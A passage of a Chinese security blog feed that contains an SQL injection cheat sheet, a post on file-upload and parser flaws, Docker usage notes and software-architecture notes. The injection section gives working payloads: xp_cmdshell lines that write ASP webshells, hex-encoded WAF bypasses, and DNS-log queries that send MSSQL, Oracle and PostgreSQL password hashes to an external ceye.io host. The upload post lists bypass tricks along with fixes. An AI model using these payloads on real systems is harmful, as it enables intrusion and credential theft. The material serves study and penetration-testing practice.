class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">@@version&gt;0</span><br><span class="line">@@SERVERNAME</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">爆数据库名</span><br><span class="line">db_name()&gt;0</span><br><span class="line">(SELECT top 1 Name FROM Master..SysDatabases)&gt;0</span><br><span class="line">(SELECT top 1 Name FROM Master..SysDatabases where name not in (&apos;master&apos;))&gt;0</span><br><span class="line">爆表名</span><br><span class="line">(select top 1 name from 数据库名.sys.all_objects where type=&apos;U&apos; AND is_ms_shipped=0)&gt;0</span><br><span class="line">users</span><br><span class="line">(select top 1 name from 数据库名.sys.all_objects where type=&apos;U&apos; AND is_ms_shipped=0 and name not in (&apos;users&apos;))&gt;0</span><br><span class="line">爆列名</span><br><span class="line">(select top 1 COLUMN_NAME from 数据库名.information_schema.columns where TABLE_NAME=&apos;表名&apos;)&gt;0</span><br><span class="line">(select top 1 COLUMN_NAME from 数据库名.information_schema.columns where TABLE_NAME=&apos;表名&apos; and COLUMN_NAME not in (&apos;列名&apos;))&gt;0</span><br><span class="line">爆数据</span><br><span class="line">(select top 1 列名 from 表名)&gt;0</span><br><span class="line">gxctf</span><br><span class="line">(select top 1 列名 from 表名 and 列名 not in (&apos;gxctf&apos;))&gt;0</span><br></pre></td></tr></table></figure><h2 id="输出到文件，上传木马"><a href="#输出到文件，上传木马" class="headerlink" title="输出到文件，上传木马"></a>输出到文件，上传木马</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1;exec master..xp_cmdshell &apos;echo &quot;&lt;%@ LANGUAGE=VBSCRIPT %&gt;;&lt;%eval request(chr(35))%&gt;&apos;&apos;&quot; &gt; d:\www\1.asp&apos;--</span><br><span class="line"></span><br><span class="line">?id=1;exec master..xp_cmdshell &apos;echo &quot;&lt;%@ LANGUAGE=Jscript %&gt;;&lt;%eval(Request(&quot;sb&quot;),&quot;unsafe&quot;)%&gt;&apos;&apos;&quot; &gt;C:\inetpub\wwwroot\2.aspx&apos; --</span><br></pre></td></tr></table></figure><h2 id="hex编码绕过waf"><a href="#hex编码绕过waf" class="headerlink" title="hex编码绕过waf"></a>hex编码绕过waf</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1. 爆数据库版本：</span><br><span class="line">select convert(int,@@version) </span><br><span class="line">hex编码后：0x73656c65637420636f6e7665727428696e742c404076657273696f6e29</span><br><span class="line">?id=1; dEcLaRe @s vArChAr(8000) sEt @s=0x73656c65637420636f6e7665727428696e742c404076657273696f6e29 eXeC(@s)--</span><br><span class="line">转换成数据类型 int 时失败。</span><br><span class="line">2. 爆当前数据库</span><br><span class="line">select convert(int,db_name()) </span><br><span class="line">hex 编码后：</span><br><span class="line">0x73656c65637420636f6e7665727428696e742c64625f6e616d65282929</span><br><span class="line">?id=1; dEcLaRe @s vArChAr(8000) sEt @s=0x73656c65637420636f6e7665727428696e742c64625f6e616d65282929 eXeC(@s)--</span><br><span class="line">3. 爆用户：</span><br><span class="line">select convert(int,User_Name())</span><br><span class="line">hex编码后：0x73656c65637420636f6e7665727428696e742c557365725f4e616d65282929</span><br><span class="line">?id=1; dEcLaRe @s vArChAr(8000) sEt @s=0x73656c65637420636f6e7665727428696e742c557365725f4e616d65282929 eXeC(@s)--</span><br><span class="line">同理</span><br></pre></td></tr></table></figure><h2 id="boolean盲注"><a href="#boolean盲注" class="headerlink" title="boolean盲注"></a>boolean盲注</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=c1&apos;/**/and/**/ascii(substring(@@version,1,1))&gt;0/**/--&amp;t=0</span><br><span class="line">?c=c1&apos;/**/and/**/ascii(substring(子查询,1,1))&gt;0/**/--&amp;t=0</span><br></pre></td></tr></table></figure><h2 id="dnslog注入"><a href="#dnslog注入" class="headerlink" title="dnslog注入"></a>dnslog注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DECLARE @host varchar(1024);</span><br><span class="line">SELECT @host=(SELECT TOP 1</span><br><span class="line">master.dbo.fn_varbintohexstr(password_hash)</span><br><span class="line">FROM sys.sql_logins WHERE name=&apos;sa&apos;)</span><br><span class="line">+&apos;.ip.port.b182oj.ceye.io&apos;;</span><br><span class="line">EXEC(&apos;master..xp_dirtree</span><br><span class="line">&quot;\\&apos;+@host+&apos;\foobar$&quot;&apos;);</span><br></pre></td></tr></table></figure><h1 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h1><h2 id="dnslog注入-1"><a href="#dnslog注入-1" class="headerlink" title="dnslog注入"></a>dnslog注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT UTL_INADDR.GET_HOST_ADDRESS(&apos;ip.port.b182oj.ceye.io&apos;);</span><br><span class="line">SELECT UTL_HTTP.REQUEST(&apos;http://ip.port.b182oj.ceye.io/oracle&apos;) FROM DUAL;</span><br><span class="line">SELECT HTTPURITYPE(&apos;http://ip.port.b182oj.ceye.io/oracle&apos;).GETCLOB() FROM DUAL;</span><br><span class="line">SELECT DBMS_LDAP.INIT((&apos;oracle.ip.port.b182oj.ceye.io&apos;,80) FROM DUAL;</span><br><span class="line">SELECT DBMS_LDAP.INIT((SELECT password FROM SYS.USER$ WHERE name=&apos;SYS&apos;)||&apos;.ip.port.b182oj.ceye.io&apos;,80) FROM DUAL;</span><br></pre></td></tr></table></figure><h1 id="Postgresql"><a href="#Postgresql" class="headerlink" title="Postgresql"></a>Postgresql</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Postgresql 默认端口 5432</span><br></pre></td></tr></table></figure><p>Postgresql查询数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT datname FROM pg_database;</span><br><span class="line">select schema_name from information_schema.schemata limit 1 offset 0; # PostgreSQL &gt;= 7.4</span><br><span class="line">SELECT relname, A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind=&apos;r&apos;) AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum&gt;0) AND (NOT A.attisdropped) AND (N.nspname ILIKE &apos;public&apos;)</span><br></pre></td></tr></table></figure></p><h2 id="dnslog注入-2"><a href="#dnslog注入-2" class="headerlink" title="dnslog注入"></a>dnslog注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">DROP TABLE IF EXISTS table_output;</span><br><span class="line">CREATE TABLE table_output(content text);</span><br><span class="line">CREATE OR REPLACE FUNCTION temp_function()</span><br><span class="line">RETURNS VOID AS $</span><br><span class="line">DECLARE exec_cmd TEXT;</span><br><span class="line">DECLARE query_result TEXT;</span><br><span class="line">BEGIN</span><br><span class="line">SELECT INTO query_result (SELECT passwd</span><br><span class="line">FROM pg_shadow WHERE usename=&apos;postgres&apos;);</span><br><span class="line">exec_cmd := E&apos;COPY table_output(content)</span><br><span class="line">FROM E\&apos;\\\\\\\\&apos;||query_result||E&apos;.psql.ip.port.b182oj.ceye.io\\\\foobar.txt\&apos;&apos;;</span><br><span class="line">EXECUTE exec_cmd;</span><br><span class="line">END;</span><br><span class="line">$ LANGUAGE plpgsql SECURITY DEFINER;</span><br><span class="line">SELECT temp_function();</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">information_schema特性支持</span><br><span class="line">Microsoft SQL Server - Supported in Version 7 and up</span><br><span class="line">MySQL - Supported in Version 5 and up</span><br><span class="line">PostgreSQL - Supported in Version 7.4 and up</span><br><span class="line">Oracle - Does not appear to be supported</span><br><span class="line">Apache Derby - NOT Supported As of Version 10.3</span><br></pre></td></tr></table></figure><h3 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h3><p><img src="https://raw.githubusercontent.com/UltramanGaia/SecMM/master/SQL%E6%B3%A8%E5%85%A5.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>解析漏洞与文件上传漏洞</title>
      <link href="//blog/2018/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html"/>
      <url>//blog/2018/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html</url>
      
        <content type="html"><![CDATA[<hr><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>文件上传是很常用的功能点，如：上传头像、上传附件、保存文件等，文件上传漏洞的思想很简单，即可以将包含恶意代码的文件上传到服务器，并且能够解析执行，从而实现getshell。</p><p>首先，本文将介绍如何解析执行文件以及已知的一些解析漏洞；</p><p>然后，本文将讲解常见文件上传漏洞的防御方式以及绕过方法；</p><p>最后，本文会提供修复文件上传漏洞的建议。</p></blockquote><h2 id="解析-amp-解析漏洞"><a href="#解析-amp-解析漏洞" class="headerlink" title="解析&amp;解析漏洞"></a>解析&amp;解析漏洞</h2><h3 id="Apache默认解析的后缀名"><a href="#Apache默认解析的后缀名" class="headerlink" title="Apache默认解析的后缀名"></a>Apache默认解析的后缀名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FilesMatch &quot;.+\.ph(p[3457]?|t|tml)$&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="IIS默认解析的后缀名"><a href="#IIS默认解析的后缀名" class="headerlink" title="IIS默认解析的后缀名"></a>IIS默认解析的后缀名</h3><ul><li><p>IIS6.0</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.asp .asa .cer .cdx</span><br><span class="line">通过aspnet_isapi.dll解析</span><br></pre></td></tr></table></figure></li></ul><h3 id="Tomcat默认解析的后缀名"><a href="#Tomcat默认解析的后缀名" class="headerlink" title="Tomcat默认解析的后缀名"></a>Tomcat默认解析的后缀名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">        &lt;servlet-name&gt;jsp&lt;/servlet-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;*.jsp&lt;/url-pattern&gt;</span><br><span class="line">        &lt;url-pattern&gt;*.jspx&lt;/url-pattern&gt;</span><br><span class="line">&lt;/servlet-mapping&gt;</span><br></pre></td></tr></table></figure><h3 id="IIS解析漏洞"><a href="#IIS解析漏洞" class="headerlink" title="IIS解析漏洞"></a>IIS解析漏洞</h3><ul><li><p>IIS6.0：<code>*.asa</code>或<code>*.asp</code>格式的目录下的任意文件会被IIS当作asp文件来解析</p></li><li><p>IIS6.0：当文件名为<code>*.asp;1.jpg</code>类型的格式时，会被IIS当做ASP脚本执行</p></li><li><p>顺带提一下，当开启WebDav拓展，并且只是PUT、Move、Copy、Delete等方法时，可被上传恶意脚本</p><blockquote><p>OPTIONS查看支持的方法</p><p>PUT上传文件</p><p>Move或Copy修改文件名</p></blockquote></li></ul><h3 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h3><ul><li>Apache 1.x &amp; 2.x：当Apache遇到不认识的后缀名时，如：<code>1.php.xx</code>，会从后往前依次尝试解析，直到发现认识的<code>php</code>后缀名，遂当做PHP脚本解析。(apache认识的后缀名储存在/etc/mime.types)</li></ul><h3 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞"></a>Nginx解析漏洞</h3><ul><li><p>(PHP CGI解析漏洞)：<code>http://ultramangaia.cn/gg.jpg</code>，在这个网址后面加上<code>1.php</code>，即<code>http://ultramangaia.cn/gg.jpg/1.php</code>，会被解析成PHP脚本。(php.ini文件中cgi.fix_pathinfo开启时/此漏洞也可能会出现在IIS7.0、IIS7.5、Lighttpd等，因为是PHP CGI的问题)</p></li><li><p>空字节：<code>http://ultramangaia.cn/gg.jpg</code>，在这个网址后面加上<code>%00.php</code>，即<code>http://ultramangaia.cn/gg.jpg%00.php</code>会导致解析为PHP脚本</p><blockquote><p>nginx 0.5.* </p><p>nginx 0.6.* </p><p>nginx 0.7 &lt;= 0.7.65 </p><p>nginx 0.8 &lt;= 0.8.37</p></blockquote></li></ul><h2 id="文件上传漏洞防御及绕过方法"><a href="#文件上传漏洞防御及绕过方法" class="headerlink" title="文件上传漏洞防御及绕过方法"></a>文件上传漏洞防御及绕过方法</h2><ul><li><p>客户端校验</p><ul><li><p>JavaScript 检查后缀名</p><p>绕过：Burp Suite 改后缀名</p></li></ul></li><li><p>服务端校验</p><ul><li><p>文件头content-type字段校验(eg. image/gif)</p><p>绕过：修改content-type字段</p></li><li><p>文件头校验(eg. GIF89a)</p><p>绕过：生成图片马绕过</p></li><li><p>后缀名黑名单/正则黑名单</p><p>绕过：黑名单覆盖不全时，可换后缀名绕过</p><p>绕过：大小写绕过</p></li><li><p>后缀名白名单/正则白名单</p></li></ul></li><li><p>WAF</p></li></ul><h3 id="其他特性利用"><a href="#其他特性利用" class="headerlink" title="其他特性利用"></a>其他特性利用</h3><ul><li><p>Windows环境的奇葩规则，如会自动去掉不符合规则符号后面的内容</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gaia.php[空格]</span><br><span class="line">gaia.php.</span><br><span class="line"></span><br><span class="line">gaia.php:1.jpg    (注：生成的文件内容是空白的)</span><br><span class="line">gaia.php::$DATA</span><br><span class="line">gaia.php::$INDEX_ALLOCATION (注：生成文件夹)</span><br><span class="line">gaia.php::$DATA.jpg  (注：生成0.jpg)</span><br><span class="line">gaia.php::$DATA\aaa.jpg (注：生成aaa.jpg)</span><br></pre></td></tr></table></figure></li><li><p>上传<code>.htaccess</code>改变解析方式</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php xxx</span><br></pre></td></tr></table></figure><p>  会将xxx后缀的文件，用PHP解析，</p><p>  或者</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;shell.jpg&quot;&gt;</span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>  会将<code>shell.jpg</code>用PHP解析。</p></li></ul><h2 id="文件上传漏洞修复建议"><a href="#文件上传漏洞修复建议" class="headerlink" title="文件上传漏洞修复建议"></a>文件上传漏洞修复建议</h2><ul><li>白名单机制</li><li>强行重命名为特定后缀名</li><li>检查文件内容</li><li>文件保存随机的文件名，在数据库中映射后缀，返回时，设置Content-Type</li><li>隐藏文件路径</li><li>文件路径在web目录之外，不能直接访问到</li><li>将上传的文件保存到OSS(阿里云)</li><li>。。。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>docker使用总结</title>
      <link href="//blog/2018/docker%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93.html"/>
      <url>//blog/2018/docker%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93.html</url>
      
        <content type="html"><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h2 id="非root用户运行"><a href="#非root用户运行" class="headerlink" title="非root用户运行"></a>非root用户运行</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">创建docker组</span><br><span class="line">sudo groupadd docker</span><br><span class="line">将当前用户加入docker组</span><br><span class="line">sudo gpasswd -a $&#123;USER&#125; docker</span><br><span class="line">重新启动docker服务</span><br><span class="line">sudo service docker restart</span><br><span class="line">当前用户退出系统重新登陆</span><br></pre></td></tr></table></figure><h2 id="运行镜像"><a href="#运行镜像" class="headerlink" title="运行镜像"></a>运行镜像</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -it imageID /bin/bash</span><br></pre></td></tr></table></figure><h2 id="docker和宿主机之间复制文件"><a href="#docker和宿主机之间复制文件" class="headerlink" title="docker和宿主机之间复制文件"></a>docker和宿主机之间复制文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">从主机复制到容器docker cp host_path containerID:container_path</span><br><span class="line">从容器复制到主机docker cp containerID:container_path host_path</span><br></pre></td></tr></table></figure><h2 id="docker-修改运行中的容器端口映射"><a href="#docker-修改运行中的容器端口映射" class="headerlink" title="docker 修改运行中的容器端口映射"></a>docker 修改运行中的容器端口映射</h2><p>解决方案一：</p><p>保存镜像，重新在docker run的时候指定端口映射。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.提交运行中的容器为一个镜像   (这样不会丢失在容器的各种操作)</span><br><span class="line">docker commit  tang     tang1</span><br><span class="line">2.运行镜像并添加端口</span><br><span class="line">docker run -d -it -p 8000:80 tang1:latest /bin/bash</span><br></pre></td></tr></table></figure><p>解决方案二：</p><p>停止容器， 停止docker服务， 修改这个容器的配置文件中端口映射</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">(CONTAINER 是 你要修改的容器的ID)</span><br><span class="line">停止容器</span><br><span class="line">docker stop CONTAINER </span><br><span class="line">停止docker服务</span><br><span class="line">sudo service docker stop</span><br><span class="line">修改配置文件</span><br><span class="line">sudo su</span><br><span class="line">cd /var/lib/docker/containers/CONTAINER*</span><br><span class="line">为方便修改，建议将下面文件内容复制出来，用JSON格式化编辑</span><br><span class="line">vi hostconfig.json</span><br><span class="line">找到&quot;PortBindings&quot;:&#123;&#125;</span><br><span class="line">改为</span><br><span class="line">&quot;PortBindings&quot;:&#123;&quot;80/tcp&quot;:[&#123;&quot;HostIp&quot;:&quot;&quot;,&quot;HostPort&quot;:&quot;10080&quot;&#125;]&#125;</span><br><span class="line">按照这个规则改好</span><br><span class="line">vi config.v2.json</span><br><span class="line">找打Config</span><br><span class="line"> &quot;Config&quot;: &#123;</span><br><span class="line">        &quot;Hostname&quot;: &quot;e17450697f6f&quot;, </span><br><span class="line">        &quot;Domainname&quot;: &quot;&quot;, </span><br><span class="line">        &quot;User&quot;: &quot;&quot;, </span><br><span class="line">        &quot;AttachStdin&quot;: true, </span><br><span class="line">        &quot;AttachStdout&quot;: true, </span><br><span class="line">        &quot;AttachStderr&quot;: true, </span><br><span class="line">        &quot;ExposedPorts&quot;: &#123;</span><br><span class="line">            &quot;22/tcp&quot;: &#123; &#125;</span><br><span class="line">        &#125;, </span><br><span class="line">        &quot;Tty&quot;: true, </span><br><span class="line">修改这里面的ExposedPorts</span><br><span class="line">找到Ports</span><br><span class="line">&quot;Ports&quot;: &#123;</span><br><span class="line">    &quot;22/tcp&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;HostIp&quot;: &quot;&quot;, </span><br><span class="line">            &quot;HostPorts&quot;: &quot;10022&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;, </span><br><span class="line">修改这里的内容</span><br><span class="line"></span><br><span class="line">sudo service docker start</span><br><span class="line"></span><br><span class="line">docker start CONTAINER</span><br></pre></td></tr></table></figure><h2 id="docker-remove-container"><a href="#docker-remove-container" class="headerlink" title="docker remove container"></a>docker remove container</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm [OPTIONS] CONTAINER [CONTAINER...]</span><br></pre></td></tr></table></figure><h2 id="docker-remove-所有-container"><a href="#docker-remove-所有-container" class="headerlink" title="docker remove 所有 container"></a>docker remove 所有 container</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm $(docker ps -a -q)</span><br></pre></td></tr></table></figure><h2 id="docker-remove-image"><a href="#docker-remove-image" class="headerlink" title="docker remove image"></a>docker remove image</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi IMAGE_ID</span><br></pre></td></tr></table></figure><h2 id="导出容器-docker-export"><a href="#导出容器-docker-export" class="headerlink" title="导出容器 docker export"></a>导出容器 docker export</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker export 7691a814370e &gt; ubuntu.tar</span><br></pre></td></tr></table></figure><h2 id="导入容器快照docker-import"><a href="#导入容器快照docker-import" class="headerlink" title="导入容器快照docker import"></a>导入容器快照docker import</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ubuntu.tar | docker import - test/ubuntu:v1.0</span><br></pre></td></tr></table></figure><h2 id="使用Dockerfile-build-镜像"><a href="#使用Dockerfile-build-镜像" class="headerlink" title="使用Dockerfile build 镜像"></a>使用Dockerfile build 镜像</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t hard_php:base -f ./Dockerfile  .</span><br></pre></td></tr></table></figure><h2 id="Docker-commit-镜像"><a href="#Docker-commit-镜像" class="headerlink" title="Docker commit 镜像"></a>Docker commit 镜像</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker commit -m &quot;Do something&quot; -a &quot;UltramanGaia&quot; cc2bbeb59944 ultramangaia/docker-sandbox</span><br></pre></td></tr></table></figure><h2 id="修改容器的端口映射"><a href="#修改容器的端口映射" class="headerlink" title="修改容器的端口映射"></a>修改容器的端口映射</h2><p>在docker使用过程中，我们常常遇见需要修改容器的端口映射的情况。</p><p>解决方案一：</p><p>保存镜像，重新在docker run的时候指定端口映射。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop container_id</span><br></pre></td></tr></table></figure><p>解决方案二：</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mybrainimage.wordpress.com/2017/02/05/docker-change-port-mapping-for-an-existing-container/" target="_blank" rel="noopener">Docker Change Port Mapping for an Existing Container</a></p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>软件体系架构</title>
      <link href="//blog/2017/%E8%BD%AF%E4%BB%B6%E4%BD%93%E7%B3%BB%E6%9E%B6%E6%9E%84.html"/>
      <url>//blog/2017/%E8%BD%AF%E4%BB%B6%E4%BD%93%E7%B3%BB%E6%9E%B6%E6%9E%84.html</url>
      
        <content type="html"><![CDATA[<h1 id="Introduction-of-software-architecture"><a href="#Introduction-of-software-architecture" class="headerlink" title="Introduction of software architecture"></a>Introduction of software architecture</h1><h2 id="what-is-Software-Architecture"><a href="#what-is-Software-Architecture" class="headerlink" title="what is Software Architecture?"></a>what is Software Architecture?</h2><h4 id="The-software-architecture-of-a-system-is-the-set-of-structures-needed-to-reason-about-the-system-which-comprise-software-elements-relations-among-them-and-properties-of-both"><a href="#The-software-architecture-of-a-system-is-the-set-of-structures-needed-to-reason-about-the-system-which-comprise-software-elements-relations-among-them-and-properties-of-both" class="headerlink" title="The software architecture of a system is the set of structures needed to reason about the system, which comprise software elements, relations among them, and properties of both."></a>The software architecture of a system is the set of structures needed to reason about the system, which comprise <em>software elements</em>, <em>relations</em> among them, and <em>properties</em> of both.</h4><h3 id="Module-Structure"><a href="#Module-Structure" class="headerlink" title="Module Structure"></a>Module Structure</h3><p>将系统划分成实现单元，即模块，来分别实现，注重于coding阶段<br>Module结构将系统划分成多个实现单元，即模块，这些模块被赋予了特定的计算职责。<br>Module structures embody decisions as to how the system is to be structured as a set of <em>code or data units</em><br>模块结构体现了系统将如何构造成一组代码或数据单元的决策。</p><h4 id="Some-useful-module-structures"><a href="#Some-useful-module-structures" class="headerlink" title="Some useful module structures"></a>Some useful module structures</h4><ul><li>Decomposition structure 分解结构<br>is-a-submodule-of关系，确保了modifiability可修改性</li><li>Uses structure 使用结构<br>classes，，use关系，需要使用前面的东西，确保了可增量开发</li><li>Layer sructure 分层结构<br>layers，，virtual machine，确保了portability可移植性</li><li>class(or generalization) structure 类结构<br>classes，，inherits from or is an instance of关系，确保了reuse和增量开发(the incremental addition of functionality)</li><li>Data Module structure 数据模型结构<br>静态信息结构，数据实体和它们的关系</li></ul><h3 id="Component-and-Connector-Structure"><a href="#Component-and-Connector-Structure" class="headerlink" title="Component and Connector Structure"></a>Component and Connector Structure</h3><p>元素之间的交互，注重于runtime运行时阶段<br>C&amp;C结构关注在运行时元素之间的交互去执行系统功能。<br>Component-and-connector structures embody decisions as to how the system is to be structured as a set of elements that have <em>runtime</em> behavior(components) and interactions(connectors).<br>组件和连接器结构体现了如何将系统构造成一组具有运行时行为（组件）和交互（连接器）的元素的决策。<br>runtime components:</p><ul><li>services</li><li>peers</li><li>clinents</li><li>servers</li><li>many other types of runtime element<br>connectors:</li><li>call-return</li><li>process synchronization operators</li><li>pipes</li></ul><h4 id="Some-useful-C-amp-C-Structure"><a href="#Some-useful-C-amp-C-Structure" class="headerlink" title="Some useful C&amp;C Structure"></a>Some useful C&amp;C Structure</h4><ul><li>Service structure<br>services,,通过服务协作机制如SOAP进行交互，确保了服务组件可以匿名开发或独立开发</li><li>Concurrency Structure<br>This structure helps determine opportunities for parallelism and the locations where resource contention may occur.<br>这种结构有助于确定并行性的机会和资源争用的地方。<br>units are components，connectors are their communication mechanism，components are arranged into logical threads，parallelism</li></ul><h3 id="Allocation-Structure"><a href="#Allocation-Structure" class="headerlink" title="Allocation Structure"></a>Allocation Structure</h3><p>分配结构描述了从软件结构到系统环境的映射(组织、开发、安装、执行环境)<br>Allocation structures show the relationship between the software elements and elements in one or more external environments in which the software is created and executed.<br>分配结构显示了在创建或执行软件的一个或多个外部环境中的软件元素和元素之间的关系。</p><ul><li>processor</li><li>directories, files…</li><li>assignment of each software element to development teams<h4 id="Some-useful-Allocation-structures"><a href="#Some-useful-Allocation-structures" class="headerlink" title="Some 